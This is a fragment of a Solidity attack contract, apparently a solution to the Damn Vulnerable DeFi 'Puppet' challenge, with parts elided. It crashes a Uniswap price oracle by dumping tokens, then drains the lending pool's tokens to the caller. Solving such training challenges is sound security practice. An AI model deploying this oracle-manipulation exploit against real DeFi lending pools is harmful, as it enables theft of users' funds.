...
import {DamnValuableToken, PuppetPool} from "./PuppetPool.sol";
...
contract PuppetPoolAttack {
    constructor(PuppetPool puppetPool, uint8 v, bytes32 r, bytes32 s) payable {
        DamnValuableToken token = puppetPool.token();
        UniswapExchangeInterface uniswapPair = UniswapExchangeInterface(puppetPool.uniswapPair());
        ...
        // swap in uniswap pair to dump the token price
        token.approve(address(uniswapPair), tokenAmount);
        uniswapPair.tokenToEthSwapInput(tokenAmount, 1, type(uint256).max);

        // borrow from pool to drain the pool
        puppetPool.borrow{value: address(this).balance}(token.balanceOf(address(puppetPool)), msg.sender);
